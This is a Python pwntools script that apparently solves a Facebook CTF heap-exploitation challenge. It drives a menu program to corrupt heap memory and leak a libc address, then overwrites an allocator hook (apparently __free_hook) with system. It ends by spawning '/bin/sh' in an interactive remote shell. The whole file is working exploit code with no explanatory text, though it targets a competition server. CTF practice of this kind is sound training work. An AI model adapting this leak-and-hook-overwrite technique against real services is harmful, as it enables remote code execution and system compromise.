from pwn import *

HOST, PORT = "challenges3.fbctf.com", "1343"
# HOST, PORT = "0.0.0.0", 31338
r = remote(HOST, PORT)

menu = lambda: r.recvuntil("> ")
ii = lambda x: r.sendline(str(x))
go = lambda x: (menu(), ii(x))[0]

def create(name):
	go(1)
	ii(name)

def add(index, value):
	ii(2)
	ii(index)
	ii(value)

def duplicate(index, name):
	go(4)
	ii(index)
	ii(name)

def get(index, element):
	go(3)
	ii(index)
	ii(element)
	r.recvuntil('] = ')
	return int(r.recvline())

pause()
create('a')
for i in range(2**8+1):
	add(0, 0x7368)

duplicate(0,'a')
for i in range(2**8):
	add(0, 0)

create('a')
a=get(1,2)
b=get(1,3)
libc=a+b*2**32-0x3ec190
print hex(libc)

for i in range(7):
	create('sh')

for i in range(23):
	add(1, 0x41414141)

_ = lambda x: x if x < 0x80000000 or 1 else x - 2 ** 32

for target in [libc+0x3ed8e8-16, libc+0x3ed8e8-8, libc + 0x3ed8e8 + 16]:
	for i in range(2):
		add(1, _(target & 0xffffffff))
		target >>= 32

system=libc+0x4f440
sh=u64('/bin/sh\x00')
add(9,_(sh&0xffffffff))
add(9,sh>>32)
add(9,_(system&0xffffffff))
add(9,system>>32)
pause()
for i in range(23):
	add(8, 0x6873)
r.interactive()
